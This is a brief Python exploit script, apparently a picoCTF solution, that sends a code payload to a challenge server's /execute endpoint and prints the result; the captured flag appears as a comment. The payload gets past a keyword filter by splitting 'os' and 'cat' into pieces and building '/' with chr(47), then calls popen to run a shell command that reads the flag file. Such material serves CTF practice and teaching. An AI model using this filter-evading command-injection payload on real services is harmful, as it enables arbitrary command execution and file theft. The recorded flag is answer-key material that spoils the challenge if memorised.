import requests

url = "http://shape-facility.picoctf.net:64106/execute"

code = "__import__('o''s').popen('ca''t '+chr(47)+'flag*').read()"

resp = requests.post(url, data={"code": code})
print(resp.text)

# picoCTF{D0nt_Use_Unsecure_f@nctionsa4121ed2}
